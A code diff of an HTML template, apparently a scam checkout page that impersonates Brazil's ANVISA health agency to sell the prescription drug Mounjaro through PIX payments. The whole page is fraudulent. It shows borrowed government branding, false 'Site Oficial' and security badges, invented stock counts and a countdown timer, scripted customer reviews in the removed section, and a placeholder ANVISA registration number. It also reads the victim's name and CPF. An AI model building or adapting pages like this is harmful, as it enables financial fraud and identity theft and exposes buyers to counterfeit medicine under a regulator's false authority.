@@ -3,7 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Oferta Especial - Último Lote | ANVISA</title>
+  <title>Complete Sua Compra | ANVISA</title>
+  <script src="https://cdn.tailwindcss.com"></script>
   <script type="text/javascript">
       (function(c,l,a,r,i,t,y){
           c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
@@ -11,15 +12,6 @@
           y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
       })(window, document, "clarity", "script", "r5wwtraiai");
   </script>
-  <script>
-    window.pixelId = "6801debea8fdc166096bba27";
-    var a = document.createElement("script");
-    a.setAttribute("async", "");
-    a.setAttribute("defer", "");
-    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-    document.head.appendChild(a);
-  </script>
-  <script src="https://cdn.tailwindcss.com"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <style>
     body {
@@ -40,460 +32,693 @@
       margin-bottom: 24px;
     }
     
-    /* Estilos para os cards personalizados */
-    .feature-card {
+    .sticky-header {
+      position: sticky;
+      top: 0;
+      background-color: white;
+      z-index: 50;
+      transition: box-shadow 0.3s ease;
+    }
+    
+    .sticky-header.shadow {
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    
+    .secure-badge {
+      display: inline-flex;
+      align-items: center;
       background-color: #f0f7ff;
-      border-radius: 10px;
-      padding: 1.2rem;
-      box-shadow: 0 3px 10px rgba(0, 0, 0, 0.08);
-      transition: transform 0.25s ease, box-shadow 0.25s ease;
-      border-left: 4px solid #1351b4;
-    }
-    
-    .feature-card:hover {
-      transform: translateY(-5px);
-      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
-    }
-    
-    .feature-card h3 {
+      color: #1351b4;
+      padding: 6px 12px;
+      border-radius: 16px;
+      font-size: 12px;
       font-weight: 600;
-      font-size: 18px;
-      color: #1351b4;
-      margin-bottom: 8px;
     }
     
-    .feature-card p {
-      font-size: 14px;
-      color: #555555;
+    .secure-badge i {
+      margin-right: 4px;
     }
     
-    .benefits-icon {
-      color: #1351b4;
-      font-size: 20px;
+    .payment-container {
+      background-color: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+      overflow: hidden;
+      max-width: 700px;
+      margin: 0 auto;
+    }
+    
+    .payment-header {
+      background-color: #f0f7ff;
+      padding: 20px;
+      border-bottom: 1px solid #e0e7ff;
+    }
+    
+    .payment-content {
+      padding: 30px;
+    }
+    
+    .btn {
+      padding: 12px 20px;
+      border-radius: 6px;
+      font-weight: 600;
+      font-size: 16px;
+      transition: all 0.2s ease;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+    }
+    
+    .btn-primary {
+      background-color: #1351b4;
+      color: white;
+      border: none;
+    }
+    
+    .btn-primary:hover {
+      background-color: #0c3d8a;
+    }
+    
+    .btn i {
       margin-right: 8px;
     }
     
-    /* Badges e ícones */
-    .anvisa-badge {
-      display: inline-flex;
-      align-items: center;
-      background-color: #e7f2ff;
-      padding: 6px 10px;
-      border-radius: 6px;
-      font-size: 14px;
-      color: #1351b4;
-      font-weight: 600;
-      margin-right: 10px;
+    .vlibras-icon {
+      position: fixed;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      z-index: 1000;
     }
     
-    /* Botão de compra */
-    .cta-button {
-      background-color: #008739;
-      color: white;
-      font-weight: 600;
-      padding: 1rem 2rem;
-      border-radius: 8px;
-      font-size: 1.1rem;
-      display: block;
-      width: 100%;
-      text-align: center;
-      box-shadow: 0 4px 10px rgba(0, 135, 57, 0.25);
-      transition: all 0.3s ease;
+    .countdown-timer {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 20px;
     }
     
-    .cta-button:hover {
-      background-color: #007131;
-      transform: translateY(-2px);
-      box-shadow: 0 6px 12px rgba(0, 135, 57, 0.3);
-    }
-    
-    .review-card {
-      background-color: white;
-      border-radius: 10px;
-      padding: 1rem;
-      margin-bottom: 1rem;
-      box-shadow: 0 3px 10px rgba(0, 0, 0, 0.08);
-      border-left: 4px solid #1351b4;
-    }
-    
-    .stock-counter {
-      background-color: #fff3cd;
-      color: #856404;
-      padding: 8px 12px;
-      border-radius: 8px;
-      display: inline-block;
-      font-weight: 600;
-      font-size: 14px;
-      animation: pulse 2s infinite;
-    }
-    
-    @keyframes pulse {
-      0% {
-        opacity: 1;
-      }
-      50% {
-        opacity: 0.8;
-      }
-      100% {
-        opacity: 1;
-      }
-    }
-    
-    .price-tag {
+    .countdown-item {
       display: flex;
       flex-direction: column;
       align-items: center;
-      margin-bottom: 1.5rem;
+      margin: 0 8px;
     }
     
-    .price-value {
-      font-size: 1.8rem;
+    .countdown-value {
+      width: 50px;
+      height: 50px;
+      background-color: #1351b4;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 24px;
       font-weight: 700;
-      color: #008739;
+    }
+    
+    .countdown-label {
+      margin-top: 4px;
+      font-size: 12px;
+      color: #6b7280;
+    }
+    
+    .pix-code-container {
+      background-color: #f9fafb;
+      border-radius: 8px;
+      padding: 16px;
+      margin: 20px 0;
+      border: 1px solid #e5e7eb;
+    }
+    
+    .pix-code-title {
+      font-size: 16px;
+      font-weight: 600;
+      color: #1351b4;
+      margin-bottom: 12px;
+      display: flex;
+      align-items: center;
+    }
+    
+    .pix-code-title i {
+      margin-right: 8px;
+      color: #1351b4;
+    }
+    
+    .pix-code {
+      background-color: white;
+      border: 1px dashed #d1d5db;
+      border-radius: 4px;
+      padding: 12px;
+      font-family: monospace;
+      font-size: 14px;
+      color: #4b5563;
+      word-break: break-all;
+      max-height: 100px;
+      overflow-y: auto;
+      margin-bottom: 16px;
+    }
+    
+    .order-summary {
+      margin-top: 24px;
+      padding-top: 24px;
+      border-top: 1px solid #e5e7eb;
+    }
+    
+    .order-summary-title {
+      font-size: 18px;
+      font-weight: 600;
+      color: #1351b4;
+      margin-bottom: 16px;
+    }
+    
+    .summary-item {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 8px;
+    }
+    
+    .summary-label {
+      font-size: 14px;
+      color: #6b7280;
+    }
+    
+    .summary-value {
+      font-size: 14px;
+      font-weight: 500;
+      color: #4b5563;
+    }
+    
+    .summary-total {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 12px;
+      padding-top: 12px;
+      border-top: 1px dashed #e5e7eb;
+    }
+    
+    .total-label {
+      font-size: 16px;
+      font-weight: 600;
+      color: #1f2937;
+    }
+    
+    .total-value {
+      font-size: 16px;
+      font-weight: 700;
+      color: #1351b4;
+    }
+    
+    .instructions {
+      margin-top: 24px;
+      padding: 16px;
+      background-color: #f0f7ff;
+      border-radius: 8px;
+      border-left: 4px solid #1351b4;
+    }
+    
+    .instructions-title {
+      font-size: 16px;
+      font-weight: 600;
+      color: #1351b4;
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+    }
+    
+    .instructions-title i {
+      margin-right: 8px;
+      color: #1351b4;
+    }
+    
+    .instructions-list {
+      margin-left: 16px;
+      margin-top: 8px;
+    }
+    
+    .instructions-list li {
+      font-size: 14px;
+      color: #4b5563;
+      margin-bottom: 6px;
+      list-style-type: disc;
+    }
+    
+    .qr-code-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin: 20px 0;
+    }
+    
+    .qr-code-image {
+      width: 220px;
+      height: 220px;
+      border: 1px solid #e5e7eb;
+      border-radius: 8px;
+      padding: 8px;
+      background-color: white;
+    }
+    
+    .status-badge {
+      display: inline-flex;
+      align-items: center;
+      padding: 4px 8px;
+      border-radius: 4px;
+      font-size: 14px;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+    
+    .status-pending {
+      background-color: #fffbeb;
+      color: #d97706;
+    }
+    
+    .copy-btn {
+      padding: 8px 16px;
+      background-color: #f3f4f6;
+      border: 1px solid #d1d5db;
+      border-radius: 4px;
+      font-size: 14px;
+      font-weight: 500;
+      color: #4b5563;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      transition: all 0.2s ease;
+    }
+    
+    .copy-btn:hover {
+      background-color: #e5e7eb;
+    }
+    
+    .copy-btn i {
+      margin-right: 6px;
+    }
+    
+    .stock-alert {
+      margin: 16px 0;
+      background-color: #fffbeb;
+      border: 1px solid #fef3c7;
+      border-radius: 8px;
+      padding: 16px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+    }
+    
+    .stock-warning {
+      display: flex;
+      align-items: flex-start;
+      background-color: #fef2f2;
+      border-left: 4px solid #ef4444;
+      padding: 12px;
+      border-radius: 0 4px 4px 0;
+    }
+    
+    .stock-warning i {
+      color: #ef4444;
+      font-size: 20px;
+      margin-right: 12px;
+      flex-shrink: 0;
+      margin-top: 2px;
+    }
+    
+    .warning-title {
+      font-weight: 600;
+      color: #ef4444;
+      margin-bottom: 4px;
+      font-size: 16px;
+    }
+    
+    .warning-text {
+      color: #1f2937;
+      font-size: 14px;
+      line-height: 1.4;
     }
   </style>
 </head>
 <body>
-  <div class="container mx-auto px-4 py-4 md:py-8 max-w-5xl">
-    <!-- Barra superior com logo da ANVISA -->
-    <header class="flex justify-between items-center mb-6">
-      <div class="flex items-center">
-        <img src="https://www.gov.br/anvisa/pt-br/++theme++anvisa2023/img/logo-anvisa.svg" alt="ANVISA" class="h-10 mr-2">
-        <div>
-          <div class="text-sm font-semibold text-blue-900">AGÊNCIA NACIONAL</div>
-          <div class="text-xs text-blue-800">DE VIGILÂNCIA SANITÁRIA</div>
+  <img src="https://i.ibb.co/btmZWCB/IMG-3113.jpg" alt="Government header" class="w-screen">
+  <div class="sticky-header">
+    <div class="container mx-auto px-4 border-b border-[#0000001a]">
+      <div class="flex items-center justify-between py-2">
+        <div class="flex items-center">
+          <i class="fas fa-bars text-sm text-[#1451B4] mr-4 relative -top-1"></i>
+          <p class="text-[14px] text-[#333333] -ml-[5px] leading-tight">
+            Centro de Verificação Digital | ANVISA
+          </p>
+        </div>
+        <div class="flex items-center space-x-4">
+          <i class="fas fa-shield-alt text-sm text-green-600 relative -top-1"></i>
+          <i class="fas fa-lock text-sm text-green-600 relative -top-1"></i>
         </div>
       </div>
-      <div class="flex items-center space-x-2">
-        <span class="anvisa-badge">
-          <i class="fas fa-check-circle mr-1"></i> Autorizado
-        </span>
-        <span class="anvisa-badge">
-          <i class="fas fa-shield-alt mr-1"></i> Seguro
-        </span>
-      </div>
-    </header>
-    
-    <!-- Título e subtítulo -->
-    <div class="mb-8">
-      <h1 class="main-title">Mounjaro™ (Tirzepatida): Medicamento Disponível</h1>
-      <p class="subtitle">Autorizado pela ANVISA para perda de peso e controle de diabetes</p>
-      
-      <!-- Contador de estoque (agora 43 unidades) -->
-      <div class="my-3 text-center">
-        <span class="stock-counter">
-          <i class="fas fa-exclamation-triangle mr-1"></i> APENAS {{ remaining_stock }} UNIDADES RESTANTES NESTE LOTE
-        </span>
-      </div>
-    </div>
-    
-    <!-- Container de conteúdo principal -->
-    <div class="lg:flex gap-6">
-      <!-- Coluna da esquerda com imagem do produto -->
-      <div class="lg:w-1/2 mb-6 lg:mb-0">
-        <div class="bg-white p-4 rounded-lg shadow-md">
-          <img src="https://www.lilly.com.br/assets/img/products/mounjaro-product.png" alt="Mounjaro Tirzepatida" class="w-full h-auto rounded-lg">
-          <div class="mt-4 text-center text-sm text-gray-500">
-            <p>Tirzepatida é um medicamento biológico fabricado e distribuído pela Eli Lilly</p>
-          </div>
-        </div>
-      </div>
-      
-      <!-- Coluna da direita com detalhes e botão de compra -->
-      <div class="lg:w-1/2">
-        <div class="bg-white p-6 rounded-lg shadow-md">
-          <!-- Informações do produto -->
-          <div class="mb-4">
-            <div class="flex justify-between items-start mb-3">
-              <h2 class="text-xl font-bold text-gray-800">Tirzepatida (Mounjaro™) 5mg</h2>
-              <div class="flex items-center">
-                <div class="flex text-yellow-400">
-                  <i class="fas fa-star"></i>
-                  <i class="fas fa-star"></i>
-                  <i class="fas fa-star"></i>
-                  <i class="fas fa-star"></i>
-                  <i class="fas fa-star-half-alt"></i>
-                </div>
-                <span class="text-sm text-gray-600 ml-1">4.8/5</span>
-              </div>
-            </div>
-            <p class="text-gray-600 mb-4">Caneta injetável com 5mg - 4 doses para uso semanal (1 mês)</p>
-          </div>
-          
-          <!-- Preço -->
-          <div class="price-tag">
-            <span class="price-value">R$ 197,90</span>
-            <p class="text-sm text-gray-600 mt-1">À vista ou em até 12x no cartão</p>
-          </div>
-          
-          <!-- Benefícios do produto -->
-          <div class="mb-6">
-            <h3 class="text-lg font-semibold text-gray-800 mb-2">Benefícios:</h3>
-            <ul class="space-y-2">
-              <li class="flex items-start">
-                <i class="fas fa-check-circle text-green-600 mr-2 mt-1"></i>
-                <span>Perda de peso significativa (13-18% do peso corporal)</span>
-              </li>
-              <li class="flex items-start">
-                <i class="fas fa-check-circle text-green-600 mr-2 mt-1"></i>
-                <span>Diminui a fome e aumenta a sensação de saciedade</span>
-              </li>
-              <li class="flex items-start">
-                <i class="fas fa-check-circle text-green-600 mr-2 mt-1"></i>
-                <span>Melhora o controle do açúcar no sangue</span>
-              </li>
-              <li class="flex items-start">
-                <i class="fas fa-check-circle text-green-600 mr-2 mt-1"></i>
-                <span>Aplicação semanal para maior conveniência</span>
-              </li>
-              <li class="flex items-start">
-                <i class="fas fa-check-circle text-green-600 mr-2 mt-1"></i>
-                <span>Envio discreto em até 24h</span>
-              </li>
-            </ul>
-          </div>
-          
-          <!-- Informações de pagamento PIX -->
-          <div class="mb-4 bg-blue-50 p-4 rounded-lg border border-blue-200">
-            <h3 class="text-lg font-semibold text-center text-blue-800 mb-3">Faça o pagamento via PIX</h3>
-            
-            {% if qr_code_url %}
-              <!-- QR Code do PIX -->
-              <div class="flex justify-center mb-4">
-                <div class="p-3 bg-white rounded-lg border border-gray-200 max-w-xs">
-                  <img src="{{ qr_code_url }}" alt="QR Code PIX" class="w-full h-auto">
-                </div>
-              </div>
-            {% endif %}
-            
-            {% if pix_code %}
-              <!-- Código PIX copiável -->
-              <div class="relative bg-white rounded-lg border border-gray-200 p-3 mb-4">
-                <div class="text-sm break-all text-gray-700 overflow-hidden" id="pixCode">{{ pix_code }}</div>
-                <button onclick="copyPixCode()" class="absolute right-2 top-2 bg-blue-600 text-white rounded-md px-3 py-1 text-xs hover:bg-blue-700">
-                  <i class="fas fa-copy mr-1"></i> Copiar
-                </button>
-              </div>
-              
-              <script>
-                function copyPixCode() {
-                  const pixCode = document.getElementById('pixCode').innerText;
-                  navigator.clipboard.writeText(pixCode).then(() => {
-                    alert('Código PIX copiado!');
-                  }).catch(err => {
-                    console.error('Erro ao copiar: ', err);
-                  });
-                }
-              </script>
-            {% endif %}
-            
-            <!-- Instruções -->
-            <div class="text-sm text-gray-600">
-              <p class="mb-2 font-semibold">Como pagar:</p>
-              <ol class="list-decimal pl-5 space-y-1">
-                <li>Abra o app do seu banco</li>
-                <li>Escolha pagar via PIX usando QR code ou copie e cole o código</li>
-                <li>Confirme o pagamento</li>
-                <li>Seu pedido será processado imediatamente após a confirmação</li>
-              </ol>
-            </div>
-          </div>
-          
-          <!-- Botão de compra (alternativa) -->
-          <a href="/compra?cpf={{ customer.customer_cpf }}&utm_source={{ utm_params.utm_source }}&utm_medium={{ utm_params.utm_medium }}&utm_campaign={{ utm_params.utm_campaign }}&utm_content={{ utm_params.utm_content }}&utm_term={{ utm_params.utm_term }}" class="cta-button">
-            <i class="fas fa-lock mr-2"></i> GARANTIR MEU FRASCO AGORA
-          </a>
-          <p class="text-center text-sm text-gray-500 mt-2">Apenas {{ remaining_stock }} unidades restantes</p>
-        </div>
-      </div>
-    </div>
-    
-    <!-- Seção de verificação de pagamento -->
-    <div class="mt-6 mb-8 bg-white p-5 rounded-lg shadow-md">
-      <div class="flex items-center justify-between mb-4">
-        <h2 class="text-xl font-bold text-gray-800">Verificar meu pagamento</h2>
-        <div class="text-sm text-gray-500">ID: {{ transaction_id }}</div>
-      </div>
-      
-      <form action="/verificar_pagamento_mounjaro" method="get" class="mb-4">
-        <input type="hidden" name="transaction_id" value="{{ transaction_id }}">
-        <button type="submit" class="bg-blue-600 text-white py-2 px-4 rounded-md w-full hover:bg-blue-700">
-          <i class="fas fa-sync-alt mr-2"></i> Verificar status do pagamento
-        </button>
-      </form>
-      
-      <div class="text-sm text-gray-600">
-        <p class="mb-2"><i class="fas fa-info-circle mr-1 text-blue-500"></i> Após realizar o pagamento, clique no botão acima para confirmar.</p>
-        <p><i class="fas fa-clock mr-1 text-blue-500"></i> O processamento do PIX pode levar até 30 segundos.</p>
-      </div>
-    </div>
-
-    <!-- Seção de reviews de clientes do lote anterior -->
-    <div class="mt-10 mb-4">
-      <h2 class="text-xl font-bold text-gray-800 mb-4">O que pessoas do lote anterior estão dizendo:</h2>
-      
-      <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-        {% if reviews %}
-          {% for review in reviews %}
-            <div class="review-card">
-              <div class="flex justify-between mb-2">
-                <div>
-                  <h4 class="font-semibold">{{ review.customer_name }}</h4>
-                  <div class="flex text-yellow-400">
-                    <i class="fas fa-star"></i>
-                    <i class="fas fa-star"></i>
-                    <i class="fas fa-star"></i>
-                    <i class="fas fa-star"></i>
-                    <i class="fas fa-star"></i>
-                  </div>
-                </div>
-                <span class="text-xs text-gray-500">{{ review.created_at.strftime('%d/%m/%Y') }}</span>
-              </div>
-              <p class="text-gray-700">"Estou muito satisfeito(a) com os resultados. Em apenas 2 semanas já notei diferença na minha disposição e apetite. Recomendo fortemente!"</p>
-            </div>
-          {% endfor %}
-        {% else %}
-          <!-- Reviews padrão caso não haja compras anteriores -->
-          <div class="review-card">
-            <div class="flex justify-between mb-2">
-              <div>
-                <h4 class="font-semibold">Maria S.</h4>
-                <div class="flex text-yellow-400">
-                  <i class="fas fa-star"></i>
-                  <i class="fas fa-star"></i>
-                  <i class="fas fa-star"></i>
-                  <i class="fas fa-star"></i>
-                  <i class="fas fa-star"></i>
-                </div>
-              </div>
-              <span class="text-xs text-gray-500">15/04/2025</span>
-            </div>
-            <p class="text-gray-700">"Estou muito satisfeita com os resultados. Em apenas 2 semanas já notei diferença na minha disposição e apetite. Perdi 5kg neste primeiro mês!"</p>
-          </div>
-          <div class="review-card">
-            <div class="flex justify-between mb-2">
-              <div>
-                <h4 class="font-semibold">João R.</h4>
-                <div class="flex text-yellow-400">
-                  <i class="fas fa-star"></i>
-                  <i class="fas fa-star"></i>
-                  <i class="fas fa-star"></i>
-                  <i class="fas fa-star"></i>
-                  <i class="fas fa-star-half-alt"></i>
-                </div>
-              </div>
-              <span class="text-xs text-gray-500">10/04/2025</span>
-            </div>
-            <p class="text-gray-700">"Incrível como meu apetite diminuiu. Não tenho mais aquela compulsão por doces e estou me sentindo muito melhor. Já recomendei para toda a família."</p>
-          </div>
-        {% endif %}
-      </div>
-    </div>
-    
-    <!-- Alerta de estoque reduzido -->
-    <div class="bg-red-50 border border-red-200 text-red-800 p-4 rounded-lg mb-8 mt-6">
-      <div class="flex items-start">
-        <i class="fas fa-exclamation-circle text-red-500 text-xl mr-3 mt-1"></i>
-        <div>
-          <h4 class="font-bold mb-1">ATENÇÃO: Estoque reduzido do último lote</h4>
-          <p>Devido à alta demanda, restam apenas {{ remaining_stock }} unidades do último lote. Após o término deste lote, não temos previsão de reposição nos próximos 60 dias devido às restrições de importação.</p>
-        </div>
-      </div>
-    </div>
-    
-    <!-- Informações de segurança -->
-    <div class="bg-gray-50 p-4 rounded-lg mb-6">
-      <h3 class="text-lg font-semibold mb-2">Informações de segurança:</h3>
-      <p class="text-sm text-gray-600 mb-2">A tirzepatida (Mounjaro™) é um medicamento sob prescrição médica. Seus efeitos podem variar de pessoa para pessoa. Consulte seu médico antes de iniciar qualquer tratamento.</p>
-      <p class="text-xs text-gray-500">ANVISA Reg.: 1.0061.XXXX-X</p>
     </div>
   </div>
   
-  <!-- Rodapé -->
-  <footer class="bg-blue-900 text-white py-4 mt-8">
-    <div class="container mx-auto px-4">
-      <div class="text-center">
-        <p class="text-sm">&copy; 2025 Agência Nacional de Vigilância Sanitária</p>
-        <p class="text-xs mt-1">Este site é apenas para fins informativos e não substitui aconselhamento médico profissional.</p>
+  <div class="container mx-auto px-4">
+    <div class="py-4">
+      <div class="flex items-center space-x-2 text-[13px]">
+        <a class="text-[#1451B4]" href="#"><i class="fas fa-home text-sm text-[#1451B4]"></i></a>
+        <span class="text-[#9E9D9D]">></span>
+        <a class="text-[#1451B4]" href="#">Portal Cidadão</a>
+        <span class="text-[#9E9D9D]">></span>
+        <a class="text-[#1451B4]" href="#">Verificação de Acesso</a>
+        <span class="text-[#9E9D9D]">></span>
+        <span class="font-bold">Finalizar Pagamento PIX</span>
       </div>
     </div>
-  </footer>
+  </div>
+
+  <main class="max-w-3xl mx-auto px-4 py-6">
+    <div class="mb-6">
+      <h2 class="main-title">
+        Não perca sua chance de adquirir o Mounjaro!
+      </h2>
+      <p class="subtitle">
+        Complete seu pagamento via PIX agora para garantir seu tratamento.
+      </p>
+    </div>
+    
+    <div class="flex flex-wrap justify-center gap-3 my-4">
+      <span class="secure-badge"><i class="fas fa-shield-alt"></i> Site Oficial</span>
+      <span class="secure-badge"><i class="fas fa-lock"></i> Conexão Segura</span>
+      <span class="secure-badge"><i class="fas fa-database"></i> Dados Protegidos</span>
+    </div>
+    
+    <div class="stock-alert">
+      <div class="stock-warning">
+        <i class="fas fa-exclamation-triangle"></i>
+        <div>
+          <p class="warning-title">Estoque extremamente limitado!</p>
+          <p class="warning-text">Restam apenas 184 unidades de Mounjaro. Finalize seu pagamento agora para garantir sua compra antes que o estoque acabe!</p>
+        </div>
+      </div>
+    </div>
+    
+    <div class="payment-container">
+      <div class="payment-header">
+        <h3 class="text-lg font-semibold text-[#0c326f]">Mounjaro - Tirzepatida 5mg</h3>
+        <div class="flex items-center mt-2">
+          <div class="status-badge status-pending">
+            <i class="fas fa-clock mr-2"></i> Aguardando Pagamento
+          </div>
+        </div>
+      </div>
+      
+      <div class="payment-content">
+        <div class="text-center mb-4">
+          <p class="text-gray-700 mb-2">Este QR Code expira em:</p>
+          <div class="countdown-timer" id="countdown">
+            <div class="countdown-item">
+              <div class="countdown-value" id="minutes">30</div>
+              <div class="countdown-label">minutos</div>
+            </div>
+            <div class="countdown-item">
+              <div class="countdown-value" id="seconds">00</div>
+              <div class="countdown-label">segundos</div>
+            </div>
+          </div>
+        </div>
+        
+        <div class="qr-code-container">
+          <img id="pixQrCode" src="{{ qr_code_url }}" alt="QR Code PIX" class="qr-code-image">
+          <p class="text-sm text-gray-500 mt-2">Escaneie com o app do seu banco</p>
+        </div>
+        
+        <div class="pix-code-container">
+          <h4 class="pix-code-title">
+            <i class="fas fa-copy"></i> Código PIX
+          </h4>
+          <div class="pix-code" id="pixCode">{{ pix_code }}</div>
+          <button id="copyButton" class="copy-btn">
+            <i class="fas fa-copy"></i> Copiar código PIX
+          </button>
+        </div>
+        
+        <div class="instructions">
+          <h4 class="instructions-title">
+            <i class="fas fa-info-circle"></i> Como pagar com PIX
+          </h4>
+          <p class="text-sm text-gray-600">Você pode pagar de duas formas:</p>
+          <ul class="instructions-list">
+            <li>Abra o aplicativo do seu banco, escolha a opção PIX e escaneie o QR Code acima.</li>
+            <li>Ou copie o código PIX, abra o aplicativo do seu banco, escolha a opção PIX > Copia e Cola e cole o código.</li>
+            <li>Confirme as informações e finalize o pagamento.</li>
+            <li>Após o pagamento, você será redirecionado automaticamente para a página de confirmação.</li>
+          </ul>
+        </div>
+        
+        <div class="order-summary">
+          <h3 class="order-summary-title">Resumo do Pedido</h3>
+          
+          <div class="summary-item">
+            <div class="summary-label">Cliente:</div>
+            <div class="summary-value" id="clientName">Carregando...</div>
+          </div>
+          
+          <div class="summary-item">
+            <div class="summary-label">CPF:</div>
+            <div class="summary-value" id="clientCpf">Carregando...</div>
+          </div>
+          
+          <div class="summary-item">
+            <div class="summary-label">Produto:</div>
+            <div class="summary-value">Mounjaro (Tirzepatida) 5mg</div>
+          </div>
+          
+          <div class="summary-item">
+            <div class="summary-label">Quantidade:</div>
+            <div class="summary-value">Ciclo de 3 meses – 4 canetas</div>
+          </div>
+          
+          <div class="summary-item">
+            <div class="summary-label">Frete:</div>
+            <div class="summary-value">Grátis</div>
+          </div>
+          
+          <div class="summary-total">
+            <div class="total-label">Total:</div>
+            <div class="total-value" id="totalAmount">R$ 197,90</div>
+          </div>
+        </div>
+        
+        <div class="mt-6 text-center">
+          <a href="#" id="checkStatusButton" class="btn btn-primary">
+            <i class="fas fa-sync-alt"></i> Verificar Status do Pagamento
+          </a>
+        </div>
+      </div>
+    </div>
+  </main>
   
-  <!-- Preservar parâmetros UTM -->
+  <div class="w-full mt-6">
+    <img src="https://i.ibb.co/DHjL5PHX/IMG-3117.jpg" alt="Imagem de rodapé do site" class="w-full">
+  </div>
+  
+  <a href="#" class="vlibras-icon">
+    <img src="https://cdn.jsdelivr.net/gh/spbgovbr-vlibras/vlibras-portal@dev/app/assets/access_icon.svg" alt="Ícone de acessibilidade em Libras" class="w-10 h-10">
+  </a>
+  
   <script>
-    // Capturar parâmetros UTM da URL
-    function getUTMParameters() {
-      const urlParams = new URLSearchParams(window.location.search);
-      const utmParams = {};
+    // Obter dados do PIX do localStorage
+    function getPixData() {
+      const pixDataStr = localStorage.getItem('pix_data');
       
-      // Lista de parâmetros UTM para capturar
-      const utmParamNames = [
-        'utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 
-        'fbclid', 'gclid', 'cpf'
-      ];
+      if (!pixDataStr) {
+        return { transaction_id: null, pix_code: null, pix_qrcode: null, amount: null };
+      }
       
-      // Capturar cada parâmetro UTM se presente
-      utmParamNames.forEach(param => {
-        if (urlParams.has(param)) {
-          utmParams[param] = urlParams.get(param);
-        }
+      try {
+        return JSON.parse(pixDataStr);
+      } catch (e) {
+        console.error("Erro ao processar dados do PIX:", e);
+        return { transaction_id: null, pix_code: null, pix_qrcode: null, amount: null };
+      }
+    }
+    
+    // Inicializar dados da página
+    function initializePageData() {
+      const { transaction_id, pix_code, pix_qrcode, amount } = getPixData();
+      
+      // Se não houver dados suficientes, redirecionar para a página de compra
+      if (!transaction_id || !pix_code || !pix_qrcode) {
+        console.error("Dados insuficientes para exibir a página de pagamento");
+        window.location.href = '/compra';
+        return;
+      }
+      
+      // Definir código PIX
+      document.getElementById('pixCode').textContent = pix_code;
+      
+      // Definir QR code
+      document.getElementById('pixQrCode').src = pix_qrcode;
+      
+      // Definir valor total se disponível
+      if (amount) {
+        document.getElementById('totalAmount').textContent = `R$ ${parseFloat(amount).toFixed(2).replace('.', ',')}`;
+      }
+      
+      // Obter e exibir dados do cliente do localStorage
+      const nomeCompleto = localStorage.getItem('nomeCompleto') || '';
+      const cpfValidado = localStorage.getItem('cpfValidado') || '';
+      
+      // Formatar CPF para exibição
+      const cpfFormatado = formatCPF(cpfValidado);
+      
+      // Atualizar os elementos na página
+      document.getElementById('clientName').textContent = nomeCompleto || 'Cliente Anvisa';
+      document.getElementById('clientCpf').textContent = cpfFormatado || 'CPF não disponível';
+      
+      // Função para formatar CPF (XXX.XXX. Font Awesome
+      function formatCPF(cpf) {
+        if (!cpf) return '';
+        
+        // Remover caracteres não numéricos
+        cpf = cpf.replace(/\D/g, '');
+        
+        // Verificar se o CPF tem 11 dígitos
+        if (cpf.length !== 11) return cpf;
+        
+        // Formatar no padrão XXX.XXX.XXX-XX
+        return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+      }
+      
+      // Configurar botão de verificação de status
+      document.getElementById('checkStatusButton').addEventListener('click', function(e) {
+        e.preventDefault();
+        checkPaymentStatus(transaction_id);
       });
       
-      return utmParams;
+      // Configurar botão de cópia
+      document.getElementById('copyButton').addEventListener('click', function() {
+        copyToClipboard(pix_code);
+      });
+      
+      // Iniciar countdown
+      startCountdown(30 * 60); // 30 minutos em segundos
+      
+      // Checar status automaticamente a cada 10 segundos
+      setInterval(function() {
+        checkPaymentStatus(transaction_id, true);
+      }, 10000);
     }
     
-    // Salvar parâmetros UTM no localStorage
-    function saveUTMParameters() {
-      const utmParams = getUTMParameters();
+    // Copiar texto para a área de transferência
+    function copyToClipboard(text) {
+      const textarea = document.createElement('textarea');
+      textarea.value = text;
+      document.body.appendChild(textarea);
+      textarea.select();
+      document.execCommand('copy');
+      document.body.removeChild(textarea);
       
-      if (Object.keys(utmParams).length > 0) {
-        localStorage.setItem('utmParams', JSON.stringify(utmParams));
-        console.log('Parâmetros UTM salvos:', utmParams);
-      }
+      const button = document.getElementById('copyButton');
+      const originalText = button.innerHTML;
+      button.innerHTML = '<i class="fas fa-check"></i> Copiado!';
+      button.style.backgroundColor = '#dcfce7';
+      button.style.borderColor = '#86efac';
+      button.style.color = '#16a34a';
+      
+      setTimeout(function() {
+        button.innerHTML = originalText;
+        button.style.backgroundColor = '';
+        button.style.borderColor = '';
+        button.style.color = '';
+      }, 2000);
     }
     
-    // Adicionar parâmetros UTM a todos os links no site
-    function appendUTMToLinks() {
-      // Obter parâmetros UTM da URL atual ou do localStorage
-      let utmParams = getUTMParameters();
+    // Iniciar contagem regressiva
+    function startCountdown(duration) {
+      let timer = duration;
+      const minutesDisplay = document.getElementById('minutes');
+      const secondsDisplay = document.getElementById('seconds');
       
-      // Se não há parâmetros na URL, tentar obter do localStorage
-      if (Object.keys(utmParams).length === 0) {
-        const savedParams = localStorage.getItem('utmParams');
-        if (savedParams) {
-          utmParams = JSON.parse(savedParams);
